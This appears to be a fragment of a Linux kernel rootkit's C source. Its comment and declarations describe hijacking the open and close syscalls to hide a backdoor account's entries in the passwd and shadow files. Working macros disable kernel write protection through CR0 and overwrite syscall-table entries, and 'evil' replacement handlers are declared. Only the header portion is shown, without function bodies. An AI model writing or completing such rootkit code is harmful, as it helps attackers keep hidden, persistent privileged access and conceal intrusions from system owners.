/* hijacks open and close syscall at all time when module is loaded
 * if open is called on evil account related files,
 *  --> hijacks write to erase rootkit content
 *  --> unloads write when close is called
 * unloads open and close syscall when module is removed
 */

#define WRITABLE 0
#define READABLE 1
#define TOGGLE_PROTECTION(x) \
	do{ \
		!x 	? write_cr0 (read_cr0 () & (~ 0x10000)) \
			: write_cr0 (read_cr0 () | 0x10000); \
	}while(0);

#define HOOK_SYSCALL(sctable, good_call, evil_call, __NR_index) \
    do{ \
        TOGGLE_PROTECTION(WRITABLE); \
        good_call = (void *)sctable[__NR_index]; \
		sctable[__NR_index] = (void *)&evil_call; \
        TOGGLE_PROTECTION(READABLE); \
    }while(0);

#define UNHOOK_SYSCALL(sctable, good_call, __NR_index) \
    do{ \
        TOGGLE_PROTECTION(WRITABLE); \
		sctable[__NR_index] = (void *)good_call; \
        TOGGLE_PROTECTION(READABLE); \
    }while(0);

static unsigned long **sys_call_table;
// original system calls
static asmlinkage int (*good_open)(char *, int, mode_t);
static asmlinkage ssize_t (*good_read)(int, void *, size_t);
static asmlinkage int (*good_close)(int);
// evil system calls
static asmlinkage int king_crimson (char *, int, mode_t);
static asmlinkage ssize_t erase_time (int, void *, size_t);
static asmlinkage int this_is_requiem (int);

enum file_content_hide {NONE, PASS_E, SHAD_E} file_content_hide;
static enum file_content_hide erase = NONE;
